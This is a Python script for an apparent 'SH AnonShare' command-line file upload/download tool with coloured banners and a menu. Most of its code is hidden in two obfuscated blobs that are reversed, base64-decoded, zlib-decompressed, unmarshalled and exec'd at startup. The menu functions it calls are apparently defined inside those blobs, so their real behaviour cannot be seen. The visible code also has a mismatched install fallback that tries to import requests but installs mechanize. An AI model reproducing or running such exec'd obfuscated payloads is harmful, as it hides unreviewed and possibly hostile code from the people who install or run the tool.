import os
import sys
import json
import time
import subprocess as s
import requests
import mechanize

try:
  import requests
except:
  os.system('pip install mechanize')
import mechanize

os.system("clear")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

color_off="\033[0m"       # Text Reset

logo=(red+"""
      _____      _                  _____ _    _
     / ____|    | |                / ____| |  | |
    | |    _   _| |__   ___ _ __  | (___ | |__| |
    | |   | | | | '_ \ / _ \ '__|  \___ \|  __  |
    | |___| |_| | |_) |  __/ |     ____) | |  | |
     \_____\__, |_.__/ \___|_|    |_____/|_|  |_|
            __/ |
           |___/""")

line=(yellow+"================================================================================================================")
tversion=(cyan+"\t\t     Version : 1.2.3 ")

tname=(cyan+"\t\t   ✯✯ SH AnonShare ✯✯")

devoloper=(green+"\t\tDevoloped By : SH TASRIF ")

def finput():
	print("\n\t   ",cyan+"[",green+"Now Press",yellow+"Enter",green+" Key To Continue",cyan+"]")

def clear():
	os.system("clear")
	
"""def header():
	clear()
	os.system("lolcat logo.txt")
	print(color_off)
	print(devoloper)
	print(" ")
	print(tname)
	print('')
	print(line)
	print(" ")"""

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=QZZRW8C+/7X9/d6G9vv/s86iZ6H/9zxjzf/+73fZ//yDlu/1X///9+j5bZeLFv++9djpM1irL9tGjJ2yJtKWfdBITeGjiSOflFE8ySvvIhFh0lyGdhRBiyhR151YQeUqmFmh9zAXRHM0SxLCrSKqELgqN6zCGEwD2r8JIw2lPAaso1DX3Bkr4h8WccmJI5ObWpVExj+pa1JuvgyuV36F8xK0gKcyhpHxtyIwI8jXUsZDWxRLDdThqgZsrfmvF6K2O/zrxmaQAXsFp44nQqHw05QrQk7uMNUevY66oXq697nKJQPTehA1sLOi8zQECTS7Ppb4OG9HPjTxErxxxv7n4kbJSf0LJFMTjsBUvSEaT8x6Wg1k3bDEWDcVMf6kquomy/Wqn6VvsJi7GlVwCtHYqBSvFED0a9gcQWJfoq8KAaVcxYRJblTq35yrfKJokq6MHyaK6BfHZHB4Jwb4tNdO+VFsWSpigFCquE3X16qy9CJvM4aUni5z2Un0SmuDqic8qLP2BC2qIYGqxlC07Rt6d+AFCt5APeQQq5K2oY2SsQmO7x5x/Ord7Cw4tlnWsxJcreeg9NSWy5wDc2ZneOfX+jcmELwIOYEooMwO14sIuWmpXS+TIRbMrZ9TgaovkA5dHYJoTXyuIBJ3MKm0CPp0TqJT21T7B95fmZtyxv9LCJr9CsGOhBDBAu522Q/IDquPGFyUVT4oHUZ2sSFwZUTMBtygkGnYIenk3XKuPfvyj3eqEJqYJr5F2IJLK3iQEAtsXaUYHodIrxblc73kp88InUj3JJW2V/LGZSp8CP07HrLz3mrOJ7eeS4qxOlMjOKHtSROuzx/iJAMEJiTnhUBelbrVCVLVLkaKXR9UmZWkxnGSE7lwlpRBaNPCaeI8RcoLTGVsHpHaQo62spq88ivkau0qaDQh9yCkwHl5LH/URWS4QBbh/VPBjAF/zFEeAArMnmPqQivAeH78gh5+G36WCa0a06trK62sKFUrpVMs/RkiojxvV91KOwgnts1RoWSRPjNIXilno+kUvpS2vXWU+4O8w52BkVQGtsgbbCvIiTVRYvr1mo0cR9CF26SkEJ6yOg9z/yGzJaaNFoa5dwytiNHwsdyZ3bDc3V/DkYsX0XmGf4NP/exKUVK5AjbwpElg5Y2WSoXLyz4NbQcMOLPe0lDHNfNjUVxsaAt/HUL0FVCMjm3075tYKBdsMkOEeZGi6utxx4QpxoxJQiOk36TyEWg8Kmm5mOJm8s614QdGt0gZjJ1cRXvtBs9Qg/I4zCJe+cok/pPL+gXiE+krnGZeRRVnZ8sBhxYNr8LLfUPWo54UO6y5s0sJsSsd/YOjiPsKbQyRU2HP/EtiOlG8PIgqZI7DPxhfeoqEvoFxwCudXZPN0iGs7febG6JGpOkNrZNJwHj1jNwQIHT6vjW224bRKl1+e9u6Pquapq415VhsrxdRCed6YfJNghnTeQwNkhiY+WfbBRo6gCfWyF9iJ2klDWQT5CYHRIn3jzdBmlnLg3TAp05wfyuXy01Zl0UeMRPMEWXgceGbulpaoUl7hjmjU4erA5pTbXSPkRVTBdfIl7Gu+YwnVnoDC/Y/ts0rI0ltxZJ3r+wfSRxm5Z/Lhe6KXAh8XkFBgIXSuPhbNiWtdo541oxaFsnrM31MFefM4asRxmnyrhtku85ro1UE0tHC6gCUXXVBKuwhw9QRw/sxF97+1xJOnbpgRPCdQpi3q21QfsOe/tWt1Et9aC1BvQvJ5U9KvUunsWeD50w9zBqx4Jh6psmWt2UywQe8TA9ogNPJaFRIdj6Wh2oqEkc/j0vKcAwg6hCH0gh2SfQE8QBAQxLmBAPDi7Je6w4f6F4JAZvTfAUt4hChSNEBACM10Fwo6rv/ss8Tbf/+1e8Xd/9n3f+9zXX5fV5jVf+op//HNf9/Vv/fBDcgx80UcOA0nrXXRxfp7Vj9s1MuMuLMFcjZ68cwEUAlwcwgNkXliNBV+ehRYI9uebldxJe'))
	
def logopsb(z):
    for l in z + '\n':
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(0.003)
        
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=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'))

#MENU
def menu():
	header()
	psb(cyan+"==> Select the number of the option that you want to    start from below : ")
	
	psb(yellow+"\n[1] Upload File\n\n[2] Download File\n\n[3] Back To CyberSH")
	
	a=str(input(red+"\n[=>] Select Your Option : "+green))
	if a=="1":
		upload()

	elif a=="2":
		download()

	elif a=="3":
		os.system("cd .. && python3 .cybersh.py")

	else:
				print(red+"\n\t\t  [×] Wrong Value Entered!")
				finput()
				a=input()
				clear()
				menu()
menu()
